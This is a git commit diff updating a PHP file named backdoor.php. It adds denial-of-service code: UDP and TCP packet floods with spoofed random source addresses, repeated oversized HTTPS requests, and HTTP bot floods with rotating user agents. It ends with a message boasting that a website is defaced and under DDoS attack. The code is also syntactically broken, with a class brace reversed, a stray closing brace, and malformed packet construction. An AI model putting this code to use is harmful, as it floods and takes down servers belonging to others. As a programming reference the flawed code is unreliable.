917947b37f97b311e3e953da036c337ce71b199d
cazzysoci <154034397+cazzysoci@users.noreply.github.com>
2024-01-02 20:57:13 +0800

    Update backdoor.php

--- backdoor.php
+++ backdoor.php
@@ -50,10 +50,66 @@ foreach ($targetIps as $targetIp) {
     }
 }
 
+// UDP Flood Attack
+$udpTargetIp = "127.0.0.1"; // Replace with the IP address of the target server
+$udpTargetPort = 53; // Replace with the port of the target server
+
+for ($i = 0; $i < 100; $i++) {
+    $packet = new UdpPacket($udpTargetIp, $udpTargetPort);
+    $packet->send();
+}
+
+// SSL/TLS Attack
+$sslTargetUrl = "https://example.com";
+$sslPayload = str_repeat("A", 1000000);
+$sslAmplificationUrl = $sslTargetUrl . "?payload=" . urlencode($sslPayload);
+
+for ($i = 0; $i < 100; $i++) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $sslAmplificationUrl);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"); 
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $response = curl_exec($ch);
+    curl_close($ch);
+}
+
+// TCP Attacks
+$targetIp = "127.0.0.1"; // Replace with the IP address of the target server
+$targetPort = 80; // Replace with the port of the target server
+
+for ($i = 0; $i < 100; $i++) {
+    $packet = new TcpPacket($targetIp, $targetPort);
+    $packet->send();
+}
+
+// Legitimate Useragents Bot Attacks
+$useragents = array(
+    "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
+);
+
+$targetUrl = "http://example.com"; // Replace with the URL of the target server
+
+for ($i = 0; $i < 100; $i++) {
+    $useragent = $useragents[array_rand($useragents)];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $targetUrl);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+    $response = curl_exec($ch);
+    curl_close($ch);
+}
+
 echo "Website successfully defaced and under DDoS attack! Enjoy the chaos!";
 
 class SynPacket
-{
+}
     private $sourceIp;
     private $sourcePort;
     private $destinationIp;
@@ -104,7 +160,7 @@ class SynPacket
         foreach ($addresses as $address) {
             $data .= $address;
         }
-        
+
         $length = strlen($data);
         $sum = 0;
         $index = 0;
@@ -137,4 +193,174 @@ class SynPacket
     }
 }
 
-?>  
+
+
+
+class UdpPacket
+{
+    private $sourceIp;
+    private $sourcePort;
+    private $destinationIp;
+    private $destinationPort;
+
+    public function __construct($destinationIp, $destinationPort)
+    {
+        $this->sourceIp = $this->generateRandomIp();
+        $this->sourcePort = $this->generateRandomPort();
+        $this->destinationIp = $destinationIp;
+        $this->destinationPort = $destinationPort;
+    }
+
+    public function send()
+    {
+        $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+
+        $packet = $this->buildPacket();
+        socket_sendto($socket, $packet, strlen($packet), 0, $this->destinationIp, $this->destinationPort);
+
+        socket_close($socket);
+    }
+
+    private function buildPacket()
+    {
+        // Build the UDP header
+        $udpHeader = pack("nnnna*", $this->sourcePort, $this->destinationPort, 8 + strlen($this->destinationIp), 0, "A");
+
+        // Build the IP header
+        $ipHeader = pack("CCnnnCCna4a4", 0x45, 0, 20 + strlen($udpHeader), 0, 0, 0x40, 0, $this->sourceIp, $this->destinationIp);
+        $ipChecksum = $this->calculateChecksum($ipHeader);
+
+        // Build the complete packet
+        $packet = $ipHeader . $udpHeader;
+        $packet[10] = $ipChecksum >> 8;
+        $packet[11] = $ipChecksum & 0xFF;
+
+        return $packet;
+    }
+
+    private function calculateChecksum($header, ...$addresses)
+    {
+        $data = $header;
+        foreach ($addresses as $address) {
+            $data .= $address;
+        }
+
+        $length = strlen($data);
+        $sum = 0;
+        $index = 0;
+
+        while ($length > 1) {
+            $sum += unpack("n", substr($data, $index, 2))[1];
+            $index += 2;
+            $length -= 2;
+        }
+
+        if ($length > 0) {
+            $sum += unpack("C", substr($data, $index, 1))[1];
+        }
+
+        while ($sum >> 16) {
+            $sum = ($sum & 0xFFFF) + ($sum >> 16);
+        }
+
+        return ~$sum & 0xFFFF;
+    }
+
+    private function generateRandomIp()
+    {
+        return long2ip(mt_rand());
+    }
+
+    private function generateRandomPort()
+    {
+        return mt_rand(1024, 65535);
+    }
+}
+}
+
+class TcpPacket
+{
+    private $sourceIp;
+    private $sourcePort;
+    private $destinationIp;
+    private $destinationPort;
+
+    public function __construct($destinationIp, $destinationPort)
+    {
+        $this->sourceIp = $this->generateRandomIp();
+        $this->sourcePort = $this->generateRandomPort();
+        $this->destinationIp = $destinationIp;
+        $this->destinationPort = $destinationPort;
+    }
+
+    public function send()
+    {
+        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+        socket_connect($socket, $this->destinationIp, $this->destinationPort);
+
+        $packet = $this->buildPacket();
+        socket_write($socket, $packet, strlen($packet));
+
+        socket_close($socket);
+    }
+
+    private function buildPacket()
+    {
+        // Build the TCP header
+        $tcpHeader = pack("nnNNCCn", $this->sourcePort, $this->destinationPort, 0, 0, 5 << 4, 0x02, 0);
+        $tcpChecksum = $this->calculateChecksum($tcpHeader, $this->sourceIp, $this->destinationIp);
+
+        // Build the IP header
+        $ipHeader = pack("CCnnnCCna4a4", 0x45, 0, 20 + strlen($tcpHeader), 0, 0, 0x40, 0, $this->sourceIp, $this->destinationIp);
+        $ipChecksum = $this->calculateChecksum($ipHeader);
+
+        // Build the complete packet
+        $packet = $ipHeader . $tcpHeader;
+        $packet[10] = $ipChecksum >> 8;
+        $packet[11] = $ipChecksum & 0xFF;
+        $packet[36] = $tcpChecksum >> 8;
+        $packet[37] = $tcpChecksum & 0xFF;
+
+        return $packet;
+    }
+
+    private function calculateChecksum($header, ...$addresses)
+    {
+        $data = $header;
+        foreach ($addresses as $address) {
+            $data .= $address;
+        }
+
+        $length = strlen($data);
+        $sum = 0;
+        $index = 0;
+
+        while ($length > 1) {
+            $sum += unpack("n", substr($data, $index, 2))[1];
+            $index += 2;
+            $length -= 2;
+        }
+
+        if ($length > 0) {
+            $sum += unpack("C", substr($data, $index, 1))[1];
+        }
+
+        while ($sum >> 16) {
+            $sum = ($sum & 0xFFFF) + ($sum >> 16);
+        }
+
+        return ~$sum & 0xFFFF;
+    }
+
+    private function generateRandomIp()
+    {
+        return long2ip(mt_rand());
+    }
+
+    private function generateRandomPort()
+    {
+        return mt_rand(1024, 65535);
+    }
+}
+
+?>
